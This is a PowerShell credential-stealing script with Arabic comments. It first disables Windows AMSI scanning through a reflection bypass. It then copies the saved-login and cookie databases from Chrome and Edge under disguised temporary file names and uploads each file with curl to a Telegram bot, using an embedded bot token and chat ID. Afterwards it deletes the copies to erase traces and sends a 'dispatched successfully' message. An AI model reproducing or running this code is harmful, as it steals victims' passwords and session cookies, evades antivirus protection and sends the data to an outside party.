# --- [1] كسر الحماية الذكي (Dynamic AMSI Bypass) ---
$s=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$s.GetField('amsiContext','NonPublic,Static').SetValue($null,(New-Object IntPtr(0)));

# --- [2] إعدادات البوت (Customer_Zero) ---
$t = "8486943426:AAEDOnZoZQZtytisq7pZPqolQPEfG4qrnAs"
$c = "7393359923"

# --- [3] ميكانيكا خطف البيانات ---
$paths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
)

foreach($p in $paths){
    if(Test-Path $p){
        # التمويه: نسخ الملف لمكان مؤقت باسم بريء عشان نتخطى "الملف قيد الاستخدام"
        $tmp = "$env:TEMP\system_cache_$(Get-Random).tmp"
        Copy-Item $p -Destination $tmp -Force
        
        # إرسال الغنيمة للبوت
        curl.exe -F "chat_id=$c" -F "document=@$tmp" "https://api.telegram.org/bot$t/sendDocument"
        
        # مسح الأثر فوراً
        Remove-Item $tmp -Force
    }
}

# إشعار انتهاء المهمة
curl.exe -X POST "https://api.telegram.org/bot$t/sendMessage" -d "chat_id=$c&text=✅ Module 02: Session Data Dispatched Successfully."
